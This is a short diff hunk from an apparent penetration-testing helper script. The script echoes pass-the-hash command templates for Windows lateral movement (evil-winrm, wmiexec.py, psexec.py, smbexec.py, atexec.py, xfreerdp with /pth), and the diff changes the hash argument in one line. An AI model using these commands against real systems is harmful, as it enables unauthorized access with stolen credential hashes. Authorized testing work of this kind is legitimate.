@@ -29,7 +29,7 @@ echo -e "${BLUE} evil-winrm -i $IP -u $username -H $NT  ${ENDCOLOR}"
 echo -e "${BLUE} wmiexec.py $Domain_Name/$Username@$IP -hashes $NTLM ${ENDCOLOR}"
 echo -e "${BLUE} xfreerdp /v:$IP /u:$Username /pth:$NT ${ENDCOLOR}"
 echo -e "${BLUE} psexec.py $Domain_Name/$Username@$IP -hashes :$NT ${ENDCOLOR}"
-echo -e "${BLUE} smbexec.py $Domain_Name/$Username@$IP -hashes :$NTLM ${ENDCOLOR}"
+echo -e "${BLUE} smbexec.py $Domain_Name/$Username@$IP -hashes $NTLM ${ENDCOLOR}"
 echo -e "${BLUE} atexec.py $Username@$IP -hashes $NTLM whoami ${ENDCOLOR}"
 
 echo -e "${RED}~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~Start The Checks~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~${ENDCOLOR}"
